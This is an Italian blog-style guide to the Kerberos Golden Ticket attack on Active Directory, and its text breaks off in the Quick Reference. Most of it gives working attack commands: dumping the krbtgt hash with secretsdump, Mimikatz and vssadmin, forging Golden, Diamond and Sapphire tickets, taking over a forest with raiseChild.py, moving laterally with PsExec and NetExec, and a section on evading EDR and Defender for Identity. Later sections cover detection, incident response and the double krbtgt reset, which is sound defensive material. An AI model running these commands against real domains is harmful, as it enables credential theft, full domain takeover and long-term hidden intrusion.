---
title: 'Golden Ticket Attack: Cos''è, Come Funziona e Come Difendersi in Active Directory'
slug: golden-ticket
description: 'Il Golden Ticket è l''attacco più pericoloso in Active Directory. Scopri come funziona, come forgiare un TGT con l''hash di krbtgt, come rilevarlo e come difenderti con il doppio reset. Guida completa.'
image: /golden-ticket-windows-cos'è-come-sfruttarlo.webp
draft: true
date: 2026-07-08T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - golden-ticket
  - active-directory
  - ticket-windows
---

# Golden Ticket Attack: Persistenza Totale in Active Directory

> **In sintesi:** Il Golden Ticket sfrutta l'hash di krbtgt per forgiare TGT validi in Active Directory, permettendo di impersonare qualsiasi utente del dominio — incluso il Domain Admin — senza conoscerne la password. Una volta ottenuto l'hash, la persistenza può durare anni. L'unica remediation è il doppio reset di krbtgt.

***

## Glossario rapido

Prima di addentrarci, chiariamo i termini chiave di Kerberos. Per un approfondimento completo sul protocollo, vedi [Kerberos — come funziona l'autenticazione in AD](https://hackita.it/articoli/kerberos/).

* **KDC (Key Distribution Center)**: Il servizio di autenticazione che gira sui Domain Controller. Emette ticket.
* **TGT (Ticket Granting Ticket)**: Il "passaporto" iniziale che ottieni dopo il login. Firmato con l'hash di krbtgt. Serve a richiedere altri ticket.
* **TGS (Ticket Granting Service)**: Il ticket che ti permette di accedere a un servizio specifico (es. C$ di un server).
* **PAC (Privilege Attribute Certificate)**: Struttura dentro il TGT che elenca i gruppi dell'utente. Il KDC la legge ma **non la verifica** contro AD — si fida della firma crittografica.
* **krbtgt**: L'account di servizio del KDC. La sua password (hash) è il "master key" del dominio. Se compromesso, l'attaccante può firmare TGT falsi che il KDC accetterà come veri.

***

## Kerberos internals: cosa succede davvero sotto il cofano

Per capire perché il Golden Ticket funziona, devi guardare dentro Kerberos. Non è magia, è crittografia pura.

**Il flusso AS-REQ / AS-REP (autenticazione iniziale)**

1. L'utente invia una richiesta **AS-REQ** al KDC con il suo nome.
2. Il KDC genera una **session key** e crea un **TGT** contenente: identità utente, timestamp, session key e **PAC** (i gruppi dell'utente).
3. Il TGT viene **cifrato con l'hash di krbtgt** e restituito nella **AS-REP**.

**TGT validation flow — cosa controlla davvero il DC**

Quando il KDC riceve un TGS-REQ:

1. **Decripta** il TGT con la propria chiave (hash di krbtgt). Se la decriptazione riesce → ticket valido.
2. **Legge il PAC** nel TGT.
3. **Non** interroga AD per verificare se l'utente esiste o se i gruppi sono corretti.

La fiducia è nella **crittografia**, non nel contenuto. Se l'attaccante ha l'hash di krbtgt, può cifrare qualsiasi TGT con qualsiasi PAC. Il KDC lo decripterà e lo accetterà senza esitazione. Questa è la falla fondamentale.

**Cosa controlla:**

* Checksum del PAC (integrità crittografica)
* Timestamp (finestra di validità, default 10 ore)

**Non controlla:**

* Se l'utente esiste in AD
* Se i gruppi nel PAC corrispondono a quelli reali
* Se il ticket è stato emesso dal KDC o da un attaccante

***

## Introduzione

Il Golden Ticket è classificato **T1558.001 (MITRE ATT\&CK)**. A differenza del [Silver Ticket](https://hackita.it/articoli/silver-ticket/) — che colpisce un singolo servizio — il Golden Ticket compromette l'intera infrastruttura di autenticazione del dominio.

**Dove si posiziona rispetto alle altre tecniche:**

| Tecnica                                                         | Cosa usi                  | Scope               | Richiede DA? |
| --------------------------------------------------------------- | ------------------------- | ------------------- | ------------ |
| [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/)     | Hash NTLM utente          | Singolo host (NTLM) | No           |
| [Pass-the-Ticket](https://hackita.it/articoli/pass-the-ticket/) | TGT/TGS estratto da LSASS | Risorse del dominio | No           |
| [Silver Ticket](https://hackita.it/articoli/silver-ticket/)     | Hash service account      | Singolo servizio    | No           |
| **Golden Ticket**                                               | Hash krbtgt               | **Intero dominio**  | **Sì**       |
| [Diamond Ticket](https://hackita.it/articoli/diamond-ticket/)   | Hash krbtgt + TGT reale   | **Intero dominio**  | **Sì**       |
| [Sapphire Ticket](https://hackita.it/articoli/sapphire-ticket/) | Hash krbtgt + PAC reale   | **Intero dominio**  | **Sì**       |

Il Golden Ticket è "il re" perché non ha scadenza naturale, non richiede di conoscere la password dell'utente impersonato, e sopravvive a qualsiasi cambio di password nel dominio — eccetto il doppio reset di krbtgt. APT29 la usa in operazioni di spionaggio documentate da MITRE e CISA. Gruppi ransomware avanzati la combinano con tecniche di esfiltrazione per mantenere accesso persistente anche dopo la scoperta della compromissione iniziale.

**Key Takeaway:** Se l'hash di krbtgt è compromesso, l'intero dominio Active Directory deve essere considerato strutturalmente compromesso. Nessun cambio di password degli amministratori risolve il problema — l'unica via è il doppio reset di krbtgt.

***

## Come funziona (e quando serve davvero)

Il KDC non mantiene uno stato dei ticket emessi: se la firma crittografica è valida, il ticket viene accettato indipendentemente da chi lo ha generato. Chiunque ottenga l'hash di krbtgt può generare ticket validi **completamente offline**, per qualsiasi utente, con qualsiasi durata — senza comunicare col DC durante l'attacco.

**Quando serve:** Il Golden Ticket è la fase finale di una compromissione profonda. Lo usi quando:

* Hai bisogno di **persistenza a lungo termine** anche se il vettore iniziale viene scoperto.
* Devi **muoverti lateralmente** in silenzio su larga scala senza generare logon NTLM rumorosi.
* Hai compromesso un **dominio child** e vuoi prendere il **dominio parent** (Forest Takeover).
* Vuoi **bucare la fiducia** tra domini in una foresta.

***

## La catena d'accesso fino a krbtgt

L'articolo parte dal presupposto che tu abbia già l'hash. Nella realtà, devi **conquistarlo**. Ecco la catena offensiva reale:

**1. Initial Access**
Phishing, VPN vulnerabile, server esposto. Ora sei su una macchina interna.

**2. Privilege Escalation**

* **[Kerberoasting](https://hackita.it/articoli/kerberoasting/)** (T1558.003): Richiedi TGS di account con SPN, li cracki offline con hashcat.
* **[AS-REP Roasting](https://hackita.it/articoli/asrep-roasting/)** (T1558.004): Utenti senza pre-autenticazione → crack offline AS-REP.
* **ACL Abuse ([BloodHound](https://hackita.it/articoli/bloodhound/))**: Trovi path verso Domain Admin via GenericAll, WriteDACL, e simili. BloodHound è un tool che mappa graficamente le relazioni di fiducia e le ACL in AD — con "Shortest Path to Domain Admin" trovi il percorso più breve verso il tuo obiettivo.
* **Zerologon / PetitPotam / PrintNightmare**: Vulnerabilità critiche che danno accesso diretto al DC.

**3. Permessi DCSync**
Serve `Replicating Directory Changes All`. Di solito ce l'hanno i Domain Admin, ma può essere delegato — usa BloodHound per trovare account con questi diritti senza che tu lo sappia.

**4. Estrazione hash krbtgt**
DCSync o dump di NTDS.dit. Catena completa.

```
[Initial Access] → Phishing, VPN, Server esposto
↓
[Privilege Escalation] → Kerberoasting, AS-REP, ACL Abuse
↓
[DCSync Rights] → Domain Admin o delega su krbtgt
↓
[Estrazione hash krbtgt] → DCSync o NTDS.dit
↓
[Forging TGT Golden Ticket] → Mimikatz / Rubeus / Impacket
↓
[Inject in memoria] → /ptt (Rubeus) o export KRB5CCNAME (Linux)
↓
[Lateral Movement] → PsExec, WMI, SMB, WinRM, NetExec
↓
[Persistenza invisibile] ← sopravvive a cambio password admin
↓
[Esfiltrazione / Obiettivo finale]
```

> Senza il doppio reset di krbtgt, il Golden Ticket rimane valido anche dopo la chiusura del vettore iniziale e il cambio di tutte le password amministrative.

***

## Attack path variation: le 3 varianti tattiche

**1. Noisy (Fast & Furious)**

* **Metodo**: Kerberoasting massivo su tutti gli SPN, DCSync immediato, Golden Ticket in 5 minuti.
* **Rischio**: Tracce ovunque — eventi 4769 anomali, 4662 su DCSync, attività insolita.
* **Quando**: Ambienti poco maturi, esercitazioni con poco tempo, o come diversivo.

**2. Stealth (Slow Dwell)**

* **Metodo**: Dormire per settimane, C2 frammentato, estrarre krbtgt via NTDS.dit di notte (più silenzioso di DCSync), Diamond Ticket con durata di 4-8 ore, usarlo su poche macchine per volta.
* **Rischio**: Basso, richiede pazienza.
* **Quando**: APT, spionaggio, ambienti con MDI o EDR attivo.

**3. Insider-Style (Legit Admin Abuse)**

* **Metodo**: Un amministratore legittimo estrae NTDS.dit "per disaster recovery" e forja il ticket offline. Nessuna tecnica di escalation — solo abuso di privilegi legittimi.
* **Rischio**: Difficilissimo da fermare. Le azioni sono legittime.
* **Quando**: Insider threat, admin malintenzionati.

***

## Prerequisiti

* Hash NTLM o chiave AES256 dell'account krbtgt
* Domain SID del dominio target
* Nome del dominio (FQDN)
* Un host da cui iniettare il ticket (non deve essere joined al dominio)

***

## Step 1 — Ottenere l'hash di krbtgt

### Via DCSync

Il metodo più comune. Richiede `Replicating Directory Changes All`. Per la guida completa vedi [DCSync](https://hackita.it/articoli/dcsync/).

**[impacket-secretsdump](https://hackita.it/articoli/impacket/)** — script Python di Impacket che esegue il DCSync o estrae hash da SAM/LSA/NTDS.dit. Funziona da Linux senza bisogno di essere sul DC.

**[Mimikatz](https://hackita.it/articoli/mimikatz/)** — tool Windows per dump credenziali da LSASS e manipolazione ticket Kerberos in memoria. `lsadump::dcsync` replica il comportamento di un DC secondario per estrarre hash dall'AD.

```bash
# Da Linux — impacket-secretsdump
impacket-secretsdump corp.local/Administrator:Password123!@<DC_IP> -just-dc-user krbtgt

# Da Windows — Mimikatz
lsadump::dcsync /domain:corp.local /user:krbtgt

# Reflective load in memoria (più stealth, evita drop del binario su disco)
# Invoke-Mimikatz viene da PowerSploit (deprecato) — in ambienti con EDR preferisci
# caricamento tramite C2 framework (Cobalt Strike, Havoc, ecc.)
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /user:krbtgt"'
```

**Output atteso:**

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561d2fcbXXXXXXXXXXXXXXXX:::
         [LM hash, ignorabile]             [NT hash — quello che ti serve]
```

### Via NTDS.dit (alternativa a DCSync)

Utile quando DCSync è monitorato. **vssadmin** è uno strumento nativo Windows (LOLBin) per creare e gestire Volume Shadow Copy — permette di copiare NTDS.dit senza problemi di lockfile attivi.

```powershell
# Crea shadow copy del disco di sistema (vssadmin — nativo Windows, zero detection)
vssadmin create shadow /for=C:

# Copia NTDS.dit e SYSTEM hive dalla shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive

# Estrai gli hash offline con Impacket da Linux
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL -just-dc-user krbtgt
```

> **RODC:** In ambienti con Read-Only Domain Controller esiste un account separato `krbtgt_XXXXX` (es. `krbtgt_34573`) per ciascun RODC. Compromettere un RODC ti dà solo l'hash di quel krbtgt locale — i ticket che generi valgono esclusivamente per le autenticazioni gestite da quel RODC specifico, non per l'intero dominio.

### Via dump diretto sul DC

Con accesso interattivo al Domain Controller (Mimikatz):

```
privilege::debug
lsadump::lsa /patch
```

***

## Step 2 — Forgiare il Golden Ticket

### Con Mimikatz

```powershell
# Base — RC4/NTLM, genera più rumore nei log
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:HASH_NTLM /ticket:golden.kirbi

# AES256 — preferibile in ambienti enterprise monitorati
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /aes256:AES_KEY /ticket:golden.kirbi

# Con group ID espliciti
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:HASH_NTLM /groups:512,519,520,513,518 /ticket:golden.kirbi

# OPSEC — durata realistica (evita il default di Mimikatz che genera ticket da 10 anni)
# /startoffset:0 = parte da adesso
# /endin:600    = valido 10 ore (default AD)
# /renewmax:10080 = rinnovo massimo 7 giorni (default AD)
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /aes256:AES_KEY /groups:512,519 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden.kirbi
```

Group ID principali da includere:

| ID  | Gruppo                      |
| --- | --------------------------- |
| 512 | Domain Admins               |
| 519 | Enterprise Admins           |
| 520 | Group Policy Creator Owners |
| 513 | Domain Users                |
| 518 | Schema Admins               |

### Con Rubeus

**[Rubeus](https://hackita.it/articoli/rubeus/)** — toolkit C# per operazioni Kerberos pure: richiesta, forge e inject di ticket in memoria. Non tocca LSASS direttamente come Mimikatz — superficie di detection ridotta per operazioni Kerberos.

```powershell
# Golden Ticket — inject diretto in memoria con /ptt (pass-the-ticket)
Rubeus.exe golden /aes256:AES_KEY /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /user:Administrator /ptt

# Con group ID espliciti
Rubeus.exe golden /aes256:AES_KEY /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /user:Administrator /groups:512,519 /ptt
```

### Con Impacket da Linux

**ticketer.py** — script Python di [Impacket](https://hackita.it/articoli/impacket/) per forgiare ticket Kerberos (.ccache) completamente offline da Linux. Produce un file ccache direttamente usabile con `export KRB5CCNAME`.

```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain corp.local -user-id 500 -groups 512,519 Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
```

### Conversione tra formati .kirbi e .ccache

I tool Windows usano il formato `.kirbi`, i tool Linux (Impacket, MIT Kerberos) usano `.ccache`. **impacket-ticketConverter** converte tra i due formati.

```bash
# Da .kirbi (Windows/Mimikatz) a .ccache (Linux/Impacket)
impacket-ticketConverter golden.kirbi golden.ccache

# Da .ccache (Linux) a .kirbi (Windows)
impacket-ticketConverter golden.ccache golden.kirbi
```

***

## Forest Takeover: da child a parent con raiseChild.py

Se hai compromesso un dominio child, puoi usare il Golden Ticket con **Extra SID** per spostarti nel dominio parent. Inserendo la SID del gruppo Enterprise Admins (519) del parent nel ticket del child, il KDC del parent ti considererà automaticamente un Enterprise Admin.

> **SID Filtering:** Se abilitata tra domini della foresta, blocca l'Extra SID e l'attacco non funziona. Verifica prima:

```cmd
nltest /domain_trusts /all_trusts
```

> Cerca `Attr:` — se vedi `0x4` (QUARANTINED) la SID Filtering è attiva e il Forest Takeover via Extra SID non funzionerà.

**Manuale con Mimikatz — `/sids` per aggiungere Extra SID:**

```powershell
kerberos::golden /user:Administrator /domain:child.corp.local \
  /sid:S-1-5-21-CHILD-SID /krbtgt:HASH_NTLM \
  /sids:S-1-5-21-PARENT-SID-519 /ticket:golden_cross.kirbi
```

**Automatico con raiseChild.py:**

**raiseChild.py** — script di [Impacket](https://hackita.it/articoli/impacket/) che automatizza completamente la Forest Takeover da child a parent domain. Richiede l'hash di krbtgt del child, gestisce l'Extra SID internamente, e può eseguire comandi direttamente sul DC del parent (es. secretsdump).

```bash
# Con hash NTLM del krbtgt child
python3 raiseChild.py -target-exec <DC_PARENT_IP> \
  -hashes :<krbtgt_ntlm_hash> child.corp.local/Administrator@<DC_CHILD_IP>

# Con AES key (più stealth)
python3 raiseChild.py -target-exec <DC_PARENT_IP> \
  -aesKey <krbtgt_aes256> child.corp.local/Administrator@<DC_CHILD_IP>
```

***

## Step 3 — Lateral Movement e verifica

**Verifica del ticket iniettato:**

```powershell
# Windows — mostra tutti i ticket in cache
klist
# Dovresti vedere: TGT per Administrator @ CORP.LOCAL

# Linux
klist   # oppure: klist -c $KRB5CCNAME
```

**Lateral Movement con i principali tool:**

**[PsExec](https://hackita.it/articoli/psexec/)** — strumento Sysinternals per esecuzione remota via SMB. Copia un servizio sul target, lo esegue, ti restituisce una shell. Rumoroso ma affidabile.

**impacket-wmiexec / impacket-smbexec** — script [Impacket](https://hackita.it/articoli/impacket/) per esecuzione remota rispettivamente via WMI e SMB. Più stealth di PsExec perché non droppano servizi.

```powershell
# Da Windows
dir \\DC01\C$
PsExec.exe \\DC01 cmd.exe

# Da Linux
impacket-wmiexec -k -no-pass corp.local/Administrator@TARGET
impacket-smbexec -k -no-pass corp.local/Administrator@TARGET
```

> WinRM con ticket forgiati può fallire se l'ambiente richiede autenticazione interattiva aggiuntiva. Non è universalmente affidabile — testalo sempre prima di contarci.

Per movimenti laterali sistematici su subnet intere, **[NetExec](https://hackita.it/articoli/netexec/)** (ex CrackMapExec) con autenticazione Kerberos è lo standard de facto — enumera, esegue comandi, dumpa SAM su N host in parallelo.

```bash
export KRB5CCNAME=Administrator.ccache
netexec smb 192.168.1.0/24 --use-kcache -x 'whoami'
netexec smb 192.168.1.0/24 --use-kcache --sam
```

***

## Diamond Ticket: la variante stealth

Il Diamond Ticket modifica un TGT **legittimo** appena rilasciato dal KDC invece di crearne uno da zero. Richiede comunque l'hash di krbtgt, ma l'AS-REQ è presente nei log — nessuna anomalia di assenza. Difficile da rilevare per i sistemi ML di MDI.

**[Rubeus](https://hackita.it/articoli/rubeus/)** — il flag corretto per diamond è `/krbkey` (non `/aes256` che è per `golden`), più `/enctype:aes256` e `/sid` obbligatorio:

```powershell
Rubeus.exe diamond /krbkey:AES_KEY /enctype:aes256 \
  /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX \
  /user:Administrator /ticketuser:Administrator /ticketuserid:500 \
  /groups:512,519 /nowrap /ptt
```

Per la guida completa vedi [Diamond Ticket](https://hackita.it/articoli/diamond-ticket/).

**Silver vs Diamond — differenze in breve:**

|                      | [Silver Ticket](https://hackita.it/articoli/silver-ticket/)     | [Diamond Ticket](https://hackita.it/articoli/diamond-ticket/)             |
| -------------------- | --------------------------------------------------------------- | ------------------------------------------------------------------------- |
| Hash necessario      | Service account (es. computer$)                                 | krbtgt                                                                    |
| Scope                | Singolo servizio (es. CIFS/HOST)                                | Intero dominio                                                            |
| Comunicazione col DC | No — completamente offline                                      | Sì — modifica un TGT reale emesso dal KDC                                 |
| AS-REQ nei log       | No                                                              | Sì                                                                        |
| Quando usarlo        | Accesso silenzioso a un servizio specifico senza toccare krbtgt | Persistenza domain-wide con minor rischio di detection rispetto al Golden |

Esiste anche il [Sapphire Ticket](https://hackita.it/articoli/sapphire-ticket/) — evoluzione ulteriore che estrae il PAC reale tramite S4U2Self+U2U, rendendo il ticket praticamente indistinguibile da uno legittimo.

***

## Sapphire Ticket: la frontiera attuale

Il [Sapphire Ticket](https://hackita.it/articoli/sapphire-ticket/) è l'evoluzione oltre il Diamond. Invece di modificare un TGT legittimo alterando i gruppi, **estrae il PAC reale dell'utente** dal KDC tramite S4U2Self+U2U e lo usa nel ticket forgiato.

> **S4U2Self+U2U:** U2U (User-to-User) è un'estensione Kerberos che permette a un utente di richiedere un ticket per sé stesso, cifrato con la propria chiave invece di quella del servizio. S4U2Self è l'estensione che permette di richiedere un TGS per conto di un altro utente. La combinazione S4U2Self+U2U forza il KDC a generare un ticket che include il PAC autentico dell'utente target — con gruppi, timestamp e checksum identici a quelli che il KDC avrebbe emesso normalmente. L'attaccante poi usa quell'informazione per firmare il ticket forgiato con krbtgt. Il risultato è un ticket il cui PAC è crittograficamente identico a quello che il KDC avrebbe emesso — inclusi gruppi, timestamp e checksum coerenti.

```bash
# ticketer.py con -request → S4U2Self+U2U per ottenere il PAC reale
python3 ticketer.py -aesKey <krbtgt_aes256> \
  -domain-sid S-1-5-21-XXXXXXXXXX -domain corp.local \
  -user Administrator -request -dc-ip <DC_IP> Administrator
```

**Perché è più stealth di Diamond:** Il PAC estratto combacia con la storia autentica dell'utente. I motori euristici che rilevano il Diamond per discrepanza timestamp/PAC non trovano anomalie.

**Limite:** Non è completamente offline — richiede contatto col KDC durante il forge. Attualmente funziona meglio su Impacket che su Mimikatz/Rubeus.

***

## OPSEC offensiva e detection bypass

In ambienti enterprise con MDI, Sentinel o EDR, queste scelte riducono la superficie di detection:

**AES256 invece di RC4**
Il tipo `0x17` (RC4) è un trigger primario nei sistemi di detection moderni. In domini configurati per AES di default, un ticket RC4 è immediatamente anomalo.

**Ticket lifetime realistico**
Mimikatz di default genera ticket con validità di anni — firma riconoscibile. Usa sempre `/startoffset:0 /endin:600 /renewmax:10080` per allinearti al default AD.

**PAC coerente con l'utente reale**
MDI scatena alert per "Nonexistent account". Non creare ticket per utenti inesistenti. Estrai i gruppi reali dell'utente (`net user <user> /domain`) e usali nel ticket — se il PAC dice "Enterprise Admin" per un account HR, l'ML lo segnala.

**Inject in memoria, non su disco**
`/ptt` con Rubeus o `export KRB5CCNAME` con Impacket evita file su disco rilevabili dagli EDR.

**Diamond o Sapphire invece di Golden**
Il Diamond genera AS-REQ nei log (nessuna anomalia di assenza). Il Sapphire ha PAC autentico. In ambienti con detection avanzata sono preferibili al Golden classico.

**NTDS.dit invece di DCSync**
DCSync genera Event ID 4662 rilevabile da MDI. L'estrazione via vssadmin è più silenziosa se non ci sono alert specifici sul VSS.

***

## Krbtgt operational reality layer

**Replication Lag**
In foreste con 10+ DC sparsi, le 10-12 ore di attesa tra i due reset non sono un consiglio — sono una **necessità fisiologica** per la convergenza della replica. Se resetti prima, alcuni DC manterranno la vecchia chiave: autenticazioni fallite a macchia di leopardo.

**Cosa rompe il reset**
Servizi con ticket di lunga durata (SharePoint, Exchange) possono andare in crash perché i loro TGT diventano non validi. Pianifica una finestra di manutenzione.

**Dual DC Sync**
Se fai DCSync su un DC secondario con il primary offline, potresti ottenere un hash vecchio di ore. Esegui sempre il dump **sul PDC Emulator**.

**Forest con 10+ DC**
Il doppio reset va eseguito sul PDC Emulator. La replica verso tutti i DC può richiedere ore — durante questo periodo i ticket forgiati con la vecchia chiave potrebbero ancora funzionare su DC non ancora replicati.

***

## Chaining: come si combina con altre tecniche

Il Golden Ticket raramente opera in isolamento. In un engagement reale lo trovi concatenato con:

* **[Kerberoasting](https://hackita.it/articoli/kerberoasting/) (T1558.003)**: Per l'escalation iniziale. TGS di servizi → crack offline.
* **[AS-REP Roasting](https://hackita.it/articoli/asrep-roasting/) (T1558.004)**: Utenti senza pre-autenticazione → crack offline.
* **[Pass-the-Ticket](https://hackita.it/articoli/pass-the-ticket/) (T1550.003)**: Movimento laterale con ticket estratti da LSASS.
* **[Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/) (T1550.002)**: Per host che non supportano Kerberos.

**Catena reale tipica:**

1. Kerberoasting su un account di servizio → hash NTLM.
2. Pass-the-Hash → foothold con privilegi locali.
3. BloodHound per ACL abuse → Domain Admin.
4. DCSync → estrai krbtgt.
5. Golden Ticket → persistenza e lateral movement su larga scala.

***

## Decision tree offensivo

```
Hai accesso a un utente?
  ├─ NO → Phishing / External Recon
  └─ SÌ → Hai privilegi locali?
        ├─ NO → Kerberoasting / AS-REP / BloodHound per escalation
        └─ SÌ → Dump LSASS o credenziali nel registry
              ├─ Hash di un Domain Admin?
              │    └─ SÌ → DCSync su krbtgt → Golden Ticket
              └─ NO → ACL Abuse per diventare DA → DCSync
                    ├─ Sei in un Child Domain?
                    │    └─ SÌ → raiseChild.py per Forest Takeover
                    │           (verifica SID Filtering prima)
                    └─ NO → Golden Ticket sul dominio corrente
                          └─ Ambiente con MDI/EDR attivo?
                               ├─ SÌ → Diamond o Sapphire Ticket
                               └─ NO → Golden Ticket classico
```

***

## Limiti ed errori comuni

* **SID errato**: Se il Domain SID è sbagliato, il ticket non funziona. Verifica con `whoami /user` o `wmic useraccount get sid`.
* **Encryption type non coerente**: Dominio che accetta solo AES → ticket RC4 rifiutato. Usa AES256.
* **Clock Skew**: Tolleranza di 5 minuti tra il sistema che inietta e il DC. Se l'orologio è sfasato, il ticket viene rifiutato.
* **PAC anomalo**: PAC senza gruppi di default (es. manca Domain Users) o con timestamp lontani dalla realtà → alert.
* **SID Filtering**: Blocca l'Extra SID nel Forest Takeover. Verifica con `nltest /domain_trusts` prima di tentare.
* **EDR sul lateral movement**: CrowdStrike o Defender possono bloccare `psexec` o `wmiexec` anche con ticket valido, se rilevano pattern sospetti.

***

## Scenario reale

Una compromissione tipica con Golden Ticket in ambienti corporate:

1. Accesso iniziale via phishing — foothold su un host interno.
2. Escalation tramite ACL abuse o AS-REP Roasting → account con diritti DCSync.
3. Estrazione hash di krbtgt via DCSync o NTDS.dit — silenziosa se non monitorata.
4. Ticket forgiato offline con durata realistica, iniettato in memoria.
5. Il vettore iniziale viene scoperto e chiuso. Le password degli admin vengono resettate. La security si ritiene al sicuro.
6. L'attaccante ha ancora accesso completo — il Golden Ticket è ancora valido.
7. Esfiltrazione prolungata per mesi.

**Il punto critico:** molte organizzazioni chiudono il vettore iniziale e si ritengono al sicuro — mentre il dominio è ancora completamente nelle mani dell'attaccante.

***

## Detection

Rilevare un Golden Ticket è complesso: il traffico Kerberos generato appare legittimo.

**🔴 HIGH — Segnali critici:**

* **Event ID 4769** (TGS request) con durata ticket anomala (oltre le 10h di default AD). Va contestualizzato con baseline comportamentale — un ticket di 10h e 1 minuto potrebbe essere falso positivo.
* **Event ID 4624** — logon Kerberos senza **AS-REQ (4768)** correlata nelle ore precedenti.
* Richieste TGS per account sensibili senza TGT request corrispondente.
* **Event ID 4675** — "SIDs were filtered" su TGS cross-domain. Il KDC ha filtrato SID dal ticket durante una trust — indica un possibile tentativo di Extra SID per Forest Takeover bloccato da SID Filtering. Se SID Filtering non è attiva, l'evento non apparirà affatto.

**🟡 MEDIUM — Segnali secondari:**

* **Ticket Encryption Type 0x17 (RC4)** in domini configurati per AES.
* Timestamp di emissione ticket incoerenti rispetto all'attività storica dell'account.
* Account che accedono a risorse inusuali rispetto al loro baseline.
* Assenza di eventi 4768 per un utente che effettua TGS request.

**Honey account:** Un account con nome da Domain Admin ma zero privilegi reali. Qualsiasi autenticazione con quel nome è un alert garantito.

**Microsoft Defender for Identity:** Ha detection built-in per Golden Ticket ("Golden Ticket attack") basata su anomalie nei TGT, assenza di AS-REQ, autenticazioni con account inesistenti.

***

## Incident Response

1. **Isola il dominio compromesso** se necessario, specialmente se la foresta è compromessa via child domain.
2. **Non resettare subito krbtgt** — prima caccia le sessioni attive dell'attaccante. Se ha ancora accesso, un nuovo ticket con la nuova chiave richiede solo altri 30 secondi.
3. **Reset di krbtgt (doppio) — metodo corretto:**

```powershell
# Metodo raccomandato — PowerShell
Set-ADAccountPassword -Identity krbtgt -Reset \
  -NewPassword (ConvertTo-SecureString "NuovaPwd1_Complessa!" -AsPlainText -Force)

# Attendi 10-12 ore per sincronizzazione multi-DC

Set-ADAccountPassword -Identity krbtgt -Reset \
  -NewPassword (ConvertTo-SecureString "NuovaPwd2_Diversa!" -AsPlainText -Force)
```

> Microsoft ha uno script ufficiale che gestisce automaticamente sincronizzazione e finestre di attesa in ambienti multi-DC: **[New-KrbtgtKeys.ps1](https://github.com/microsoft/New-KrbtgtKeys.ps1)**

```powershell
# Reset automatico con doppio ciclo e attesa sincronizzazione inclusa
.\New-KrbtgtKeys.ps1 -DomainFQDN corp.local -ResetType Twice
# Lo script esegue il primo reset, aspetta la replica su tutti i DC,
# poi esegue il secondo reset automaticamente — zero calcoli manuali.
```

> **Importante:** `klist purge` pulisce solo la cache locale del sistema su cui viene eseguito. **Non invalida i Golden Ticket** in possesso degli attaccanti. L'unica cosa che invalida i ticket forgiati è il reset di krbtgt.

1. **Hunting sulle persistenze:** Scheduled tasks, servizi, WMI subscription, script di avvio. Account backdoor con SIDHistory anomala sui DC.
2. **Review ACL e trust:** Verifica deleghe modificate o trust malevole create dall'attaccante.
3. **Cambia tutte le password degli account privilegiati** dopo il secondo reset di krbtgt.
4. **Abilita logging avanzato:** Auditing su eventi 4768, 4769, 4770, 4771.

***

## Mitigazione e prevenzione

* **Doppio reset di krbtgt dopo ogni compromissione sospetta** (10-12h tra i due). Usa [New-KrbtgtKeys.ps1](https://github.com/microsoft/New-KrbtgtKeys.ps1).
* **Forza AES come encryption type:** `msDS-SupportedEncryptionTypes = 24` (AES128+AES256) o `16` (solo AES256). Non previene il Golden Ticket se l'hash AES è già compromesso, ma aumenta il costo dell'attacco.
* **Monitora DCSync** con alert su Event ID 4662 per accessi all'oggetto krbtgt con diritti di replica.
* **[Protected Users Security Group](https://hackita.it/articoli/active-directory/):** Aggiungici tutti gli account amministrativi — impedisce NTLM, forza AES, blocca la delega Kerberos.
* **Mappa tutti i path verso krbtgt con [BloodHound](https://hackita.it/articoli/bloodhound/)** e rimuovi le deleghe non necessarie.
* **Implementa Microsoft Defender for Identity** per correlazione comportamentale anomalie Kerberos.
* **Rotazione periodica di krbtgt (almeno semestrale)** come igiene preventiva.
* **Principio del minimo privilegio:** Pochissimi account dovrebbero avere DCSync rights.
* **SID Filtering tra domini della foresta:** Riduce la superficie di Forest Takeover via Extra SID.

***

## Confronto: Golden / Silver / Diamond / Sapphire

| Caratteristica         | Golden Ticket                    | Silver Ticket                    | Diamond Ticket               | Sapphire Ticket                 |
| ---------------------- | -------------------------------- | -------------------------------- | ---------------------------- | ------------------------------- |
| Hash usato             | krbtgt                           | Service account                  | krbtgt + TGT reale           | krbtgt + PAC reale via S4U2Self |
| Scope                  | Intero dominio                   | Singolo servizio                 | Intero dominio               | Intero dominio                  |
| Comunicazione col DC   | No (offline)                     | No (offline)                     | Sì (ottiene TGT)             | Sì (ottiene PAC)                |
| AS-REQ nei log         | No                               | No                               | Sì                           | Sì                              |
| PAC coerente con AD    | No (forgiato)                    | N/A                              | Parzialmente                 | Sì (autentico)                  |
| Rilevazione principale | Assenza AS-REQ, lifetime anomalo | PAC non valido (se non forgiato) | Discrepanza timestamp/gruppi | Molto difficile                 |
| Remediation            | Doppio reset krbtgt              | Cambio service account           | Doppio reset krbtgt          | Doppio reset krbtgt             |

***

## Quick Reference

**1. Estrazione hash krbtgt via DCSync (Mimikatz):**

```powershell
lsadump::dcsync /domain:corp.local /user:krbtgt
```

**2. Forging con Mimikatz (AES256 + durata realistica):**

```powershell
